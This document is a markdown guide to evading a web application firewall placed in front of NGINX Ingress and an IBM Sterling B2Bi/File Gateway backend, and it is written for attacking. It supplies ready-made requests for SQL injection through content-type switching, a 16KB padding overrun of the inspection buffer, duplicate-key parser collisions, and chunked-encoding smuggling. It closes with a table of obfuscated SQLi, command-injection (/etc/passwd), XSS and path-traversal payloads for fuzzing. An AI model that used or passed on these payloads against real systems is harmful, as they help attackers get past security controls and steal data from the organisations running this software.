# Specialized WAF Bypass Guide: Navigating "400 Bad Request" in NGINX Ingress
**Target Architecture**: Edge WAF → NGINX Ingress → IBM Sterling / Backend
**Contexts**: `application/json`, `text/plain`
**Focus**: Bypassing 400 Errors via Parser Differentials and Obfuscation

When an RPC request returns a **400 Bad Request**, it usually means your payload has hit a "Straightforward" signature or a schema violation. For NGINX Ingress environments, these "400" blocks can be bypassed by exploiting how the Ingress Controller and the Backend interpret the HTTP body differently.

---

## 1. Diagnostic: Is it the WAF or the Server?

Before applying specialized obfuscation, you must isolate the blocker:
1.  **The "Minimalist" Test**: Send a raw, empty JSON object `{}`. If this still returns 400, the blocker is likely a **Content-Length** or **Content-Type** rule in NGINX.
2.  **The "Keyword" Test**: Send a JSON string with a safe keyword (e.g., `{"test": "hello"}`). Then send `{"test": "SELECT"}`. If the latter returns 400, you have identified a **Keyword Signature** block.

---

## 2. Technique 1: Content-Type Deception (JSON-as-Text)
*   **The Mechanic**: Many WAFs apply "Deep Inspection" rules (SQLi/XSS signatures) only when the `Content-Type` is `application/json`. By switching to `text/plain`, the WAF may fall back to a "Lightweight" inspection mode.
*   **Success Condition**: The Backend application (B2Bi/SFG) must be configured to attempt parsing of bodies even if the `Content-Type` header doesn't perfectly match (Common in modern REST frameworks).
*   **Burp/cURL Payload**:
    ```http
    POST /filegateway/isomorphic/IDACall HTTP/1.1
    Content-Type: text/plain
    ...
    {"dataSource":"UserDS","operationType":"fetch","data":{"id":"' OR 1=1 --"}}
    ```

---

## 3. Technique 2: NGINX Ingress Buffer Overrun (8KB/16KB Padding)
*   **The Mechanic**: WAFs and NGINX Ingress have internal "Inspection Buffers" to maintain performance. If a request body is very large, the WAF may only inspect the first **8,192 bytes**.
*   **Success Condition**: Your backend can handle large requests, and the malicious payload is placed *after* a large block of non-functional data.
*   **Burp Suite Payload (JSON Padding)**:
    ```json
    {
      "junk": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...[Repeat for 16,000 bytes]...",
      "dataSource": "UserDS",
      "operationType": "fetch",
      "data": {"id": "' OR 1=1 --"}
    }
    ```

---

## 4. Technique 3: JSON Key Overwriting (The "Parser Collision")
*   **The Mechanic**: NGINX Ingress and the Backend application may use different JSON parsers. If a key is duplicated, one parser might take the **First** occurrence (The WAF), while the other takes the **Last** (The Backend).
*   **Success Condition**: Discrepancy between WAF (Ingress) and App parser logic.
*   **Burp Suite Payload**:
    ```json
    {
      "dataSource": "SafeDataSource",
      "dataSource": "SensitiveDataSource",
      "operationType": "fetch",
      "data": {"id": "1"}
    }
    ```
    *WAF assesses 'SafeDataSource' as benign; Backend executes operation on 'SensitiveDataSource'.*

---

## 5. Technique 4: Transfer-Encoding Smuggling (Chunked Obfuscation)
*   **The Mechanic**: By sending the request with `Transfer-Encoding: chunked`, you fragment the payload. If the WAF fails to correctly reassemble the chunks before inspection, it misses the cross-chunk signature.
*   **Success Condition**: NGINX Ingress correctly handles the chunks but the WAF/Secondary filter does not.
*   **Payload Example (Raw Body)**:
    ```text
    4
    {"da
    b
    taSource":"
    11
    SensitiveDS"...
    0
    ```

---

## 6. Advanced Obfuscated Payloads for Burp Intruder

Use these "Specialized" strings for fuzzing when standard payloads return 400:

| Attack Class | Advanced Obfuscated Payload | Why it Bypasses 400s |
| :--- | :--- | :--- |
| **SQLi** | `\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031` | JSON-native Unicode escapes hide `' OR 1=1`. |
| **CmdInj** | `${u:-c}${u:-a}${u:-t}${IFS}/etc/passwd` | Bypasses keyword/space filters via variable expansion. |
| **CmdInj** | `cat$u\u0020/etc/passwd` | Mixed Unicode/Variable obfuscation. |
| **XSS** | `\u003csvg/onload=alert(1)\u003e` | Evades `<` and `script` regex signatures. |
| **Path Traversal**| `..%252f..%252f..%252fetc/passwd` | Double-URL encoding targets flawed normalization. |

---

## 7. Strategic Recommendation

> [!CAUTION]
> **Diagnostic Precision**: If the 400 error persists even after applying "Technique 1" (JSON-as-Text), the block is likely at the **NGINX Ingress** level based on its **Request Schema** or **Max Request Size** settings. 

In this scenario, focus on **Technique 2 (Padding)** to determine the exact threshold of the Ingress Controller's inspection window.
